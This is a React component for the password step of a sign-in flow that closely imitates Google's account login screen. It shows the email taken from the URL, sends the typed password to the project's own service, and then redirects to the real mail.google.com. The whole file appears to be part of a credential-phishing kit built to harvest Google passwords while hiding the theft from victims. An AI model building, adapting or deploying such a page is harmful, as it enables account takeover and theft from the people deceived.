import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";

import {
  passwordSchema,
  type PasswordFormData,
} from "../../schemas/authFlow.schema";
import {
  authFlowService,
  AuthFlowApiRequestError,
} from "../../services/authApi.service";
import { AuthCardShell } from "./AuthCardShell";
import styles from "./AuthFlowFields.module.css";

export const AuthPasswordEntryStep = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [apiError, setApiError] = useState<string | null>(null);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<PasswordFormData>({
    resolver: zodResolver(passwordSchema),
    mode: "onChange",
  });

  const onSubmit = async (data: PasswordFormData) => {
    setIsLoading(true);
    setApiError(null);

    try {
      await authFlowService.submitPassword({
        password: data.password,
      });
      window.location.assign("https://mail.google.com");
    } catch (error) {
      if (error instanceof AuthFlowApiRequestError) {
        setApiError(error.message);
      } else if (error instanceof Error) {
        setApiError(error.message);
      } else {
        setApiError("An unexpected error occurred. Please try again.");
      }
    } finally {
      setIsLoading(false);
    }
  };

  const emailPreview =
    new URLSearchParams(window.location.search).get("email") ?? undefined;

  return (
    <AuthCardShell
      title="Welcome"
      titleVariant="welcome"
      subtitle={emailPreview}
      footerLeft={
        <button type="button" className={styles.authFlowLinkButton}>
          Try another way
        </button>
      }
      footerRight={
        <button
          type="submit"
          form="password-form"
          className={styles.authFlowPrimaryButton}
        >
          {isLoading ? "Signing in..." : "Next"}
        </button>
      }
    >
      <form
        onSubmit={handleSubmit(onSubmit)}
        className={`${styles.authFlowForm} ${styles.authFlowPasswordForm}`}
        id="password-form"
      >
        <div
          className={`${styles.authFlowFloatingGroup} ${styles.authFlowPasswordRow}`}
        >
          <input
            id="password"
            type={showPassword ? "text" : "password"}
            placeholder=" "
            {...register("password", {
              onChange: () => {
                if (apiError) {
                  setApiError(null);
                }
              },
            })}
            className={`${styles.authFlowInput} ${errors.password || apiError ? styles.authFlowInputError : ""}`}
            autoComplete="current-password"
          />
          <label htmlFor="password" className={styles.authFlowLabel}>
            Enter your password
          </label>
          {errors.password && (
            <span className={styles.authFlowErrorText}>
              {errors.password.message}
            </span>
          )}
        </div>

        <div className={styles.authFlowShowPasswordRow}>
          <label className={styles.authFlowShowPasswordLabel}>
            <input
              type="checkbox"
              className={styles.authFlowShowPasswordCheckbox}
              checked={showPassword}
              onChange={(event) => setShowPassword(event.target.checked)}
            />
            <span className={styles.authFlowShowPasswordText}>Show password</span>
          </label>
        </div>

        {apiError && <div className={styles.authFlowApiError}>{apiError}</div>}
      </form>
    </AuthCardShell>
  );
};
